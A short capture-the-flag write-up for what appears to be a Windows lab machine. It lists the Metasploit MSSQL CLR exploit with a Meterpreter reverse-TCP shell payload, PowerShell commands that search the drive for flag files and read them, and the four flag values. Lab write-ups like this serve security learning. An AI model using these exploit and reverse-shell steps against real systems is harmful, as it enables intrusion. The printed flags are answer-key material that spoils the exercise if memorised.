- Start with basic nmap scan.

- We gain access to the target with a meterpreter session with this:
```bash
> use windows/mssql/mssql_clr_payload
> set payload windows/x64/meterpreter/reverse_tcp

flag1.txt: 31665ca904ca44c386e5581ffb06cf08
```

---

```bash
To search for all flags:
powershell > powershell -Command "Get-ChildItem -Path 'C:\' -Recurse -Filter 'flag*' -File 2>$null"

powershell > C:\Windows\System32\config>type flag2.txt

flag2.txt: f9b5fadced9647bb97ae473582be6b1c
```

---

```bash
powershell > C:\Windows\System32\drivers\etc>type EscaltePrivilageToGetThisFlag.txt

flag3.txt: b8fbad579bc24a2797f79c1dbb0bd2fb
```

----

```bash
powershell > type C:\Users\Administrator\Desktop\flag4.txt

flag4.txt: 06727bbbfe154c17aa6abca087fd45f5
```